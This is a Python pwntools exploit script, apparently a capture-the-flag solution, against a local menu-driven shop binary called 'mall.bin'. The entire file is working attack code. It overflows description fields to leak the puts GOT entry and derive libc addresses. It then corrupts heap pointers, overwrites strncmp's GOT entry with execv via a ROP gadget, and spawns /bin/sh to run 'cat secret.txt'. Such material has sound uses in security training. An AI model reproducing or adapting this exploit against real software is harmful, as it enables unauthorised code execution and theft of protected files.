#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    
    p = process("./mall.bin")
    input()
    puts_got = p64(0x602030)
    strncmp_got = p64(0x602020)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    puts_offset = libc.symbols['puts']
    gets_offset = libc.symbols['gets']
    execv_offset = libc.symbols['execv']
    offset = puts_offset - execv_offset
    offset2 = puts_offset - gets_offset
    rdi_gadget = p64(0x4013a3)
    items_addr = p64(0x6020e0)
    
    p.recvuntil(b"choice: ")
    p.sendline(b"A")
    p.recvuntil(b"): ")
    p.sendline(b"pc")
    p.recvuntil(b"item: ")
    p.sendline(b"aa")
    p.recvuntil(b"tion: ")    
    p.sendline(b"desdes")
    p.recvuntil(b"price: ")
    p.sendline(b"12345678")
    p.recvuntil(b"...): ")
    p.sendline(b"i9")
    p.recvuntil(b"GB): ")
    p.sendline(b"12")
    p.recvuntil(b"GB): ")
    p.sendline(b"2048")
    
    p.recvuntil(b"choice: ")
    p.sendline(b"A")
    p.recvuntil(b"): ")
    p.sendline(b"pc")
    p.recvuntil(b"item: ")
    p.sendline(b"bb")
    p.recvuntil(b"tion: ")    
    p.sendline(b"asasas")
    p.recvuntil(b"price: ")
    p.sendline(b"1234")
    p.recvuntil(b"...): ")
    p.sendline(b"i7")
    p.recvuntil(b"GB): ")
    p.sendline(b"16")
    p.recvuntil(b"GB): ")
    p.sendline(b"1024")
    
    p.recvuntil(b"choice: ")
    p.sendline(b"M")
    p.recvuntil(b"modify: ")
    p.sendline(b"bb")
    p.recvuntil(b"tion: ")
    p.sendline(b"a"*65)
    
    p.recvuntil(b"choice: ")
    p.sendline(b"A")
    p.recvuntil(b"): ")
    p.sendline(b"pc")
    p.recvuntil(b"item: ")
    p.sendline(b"cc")
    p.recvuntil(b"tion: ")    
    p.sendline(b"cc")
    p.recvuntil(b"price: ")
    p.sendline(b"1234")
    p.recvuntil(b"...): ")
    p.sendline(b"i")
    p.recvuntil(b"GB): ")
    p.sendline(b"16")
    p.recvuntil(b"GB): ")
    p.sendline(b"1024")
    
    p.recvuntil(b"choice: ")
    p.sendline(b"M")
    p.recvuntil(b"modify: ")
    p.sendline(b"bb")
    p.recvuntil(b"tion: ")
    p.send(b"a"*73)
    
    p.recv()
    p.sendline(b"A")
    p.recvuntil(b"): ")
    p.sendline(b"pc")
    p.recvuntil(b"item: ")
    p.sendline(b"dd")
    p.recvuntil(b"tion: ")    
    p.sendline(b"aa")
    p.recvuntil(b"price: ")
    p.sendline(b"1234")
    p.recvuntil(b"...): ")
    p.sendline(b"i7")
    p.recvuntil(b"GB): ")
    p.sendline(b"16")
    p.recvuntil(b"GB): ")
    p.sendline(b"1024")
    
    p.recvuntil(b"choice: ")
    p.sendline(b"M")
    p.recvuntil(b"modify: ")
    p.sendline(b"bb")
    p.recvuntil(b"tion: ")
    p.sendline(b"a"*32+puts_got)
    p.recv()

    p.sendline(b"L")
    print(p.recvuntil(b"\n"))
    print(p.recvuntil(b"\n"))
    print(p.recvuntil(b"\n"))
    puts_addr = p.recv()
    print(puts_addr)
    puts_addr = puts_addr.split()[3]
    puts_addr = int.from_bytes(puts_addr[1:-2],'little')   
    execv_addr = puts_addr - offset
    gets_addr = puts_addr - offset2

    p.sendline(b"M")
    p.recvuntil(b"modify: ")
    p.sendline(b"bb")
    p.recvuntil(b"tion: ")
    p.sendline(b"a"*32+items_addr)
    p.recv()
    
    p.sendline(b"L")
    print(p.recvuntil(b"\n"))
    print(p.recvuntil(b"\n"))
    print(p.recvuntil(b"\n"))
    heap_addr = p.recv()
    print(heap_addr)
    heap_addr = heap_addr.split()[3]
    heap_addr = int.from_bytes(heap_addr[1:-2],'little')
    #p.send(rdi_gadget+items_addr+p64(puts_addr)+p64(0x40114))
    #print(p.recv())
    
    p.sendline(b"A")
    p.recvuntil(b"): ")
    p.sendline(b"pc")
    p.recvuntil(b"item: ")
    p.sendline(b"/bin/sh")
    p.recvuntil(b"tion: ")    
    p.sendline(b"-p")
    p.recvuntil(b"price: ")
    p.sendline(b"1234")
    p.recvuntil(b"...): ")
    p.sendline(b"i7")
    p.recvuntil(b"GB): ")
    p.sendline(b"16")
    p.recvuntil(b"GB): ")
    p.sendline(b"1024")
    
    p.sendline(b"D")
    p.recvuntil(b"delete: ")
    p.sendline(b"aa")
    p.recv()
    p.sendline(b"A")
    p.recv()
    p.sendline(b"pc")
    p.recv()
    p.sendline(p32(heap_addr+0x230)+b"\x00\x00\x00\x00"+p32(heap_addr+0x280)+b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
    p.recvuntil(b"tion: ")    
    p.sendline(b"aa")
    p.recvuntil(b"price: ")
    p.sendline(b"1234")
    p.recvuntil(b"...): ")
    p.sendline(b"i7")
    p.recvuntil(b"GB): ")
    p.sendline(b"16")
    p.recvuntil(b"GB): ")
    p.sendline(b"1024")
    
    p.recv()
    
    p.sendline(b"M")
    p.recvuntil(b"modify: ")
    p.sendline(b"bb")
    p.recvuntil(b"tion: ")
    p.sendline(b"a"*48 + rdi_gadget)
    p.recv()
    
    p.sendline(b"M")
    p.recvuntil(b"modify: ")
    p.sendline(b"bb")
    p.recvuntil(b"tion: ")
    p.sendline(rdi_gadget)
    
    p.recv()
    p.sendline(b"V")
    p.recv()
    p.send(rdi_gadget+strncmp_got+p64(gets_addr)+b"\x4c\x11\x40\x00\x00\x00\x00")
    p.sendline(p64(execv_addr)[0:7])
    p.recvuntil(b"Input your choice: ")
    p.sendline(b"V")
    p.recv()
    p.sendline(b"/bin/sh")
    p.sendline(b"cat secret.txt")
    print(p.recv())
    

if __name__ == "__main__":
    exploit()
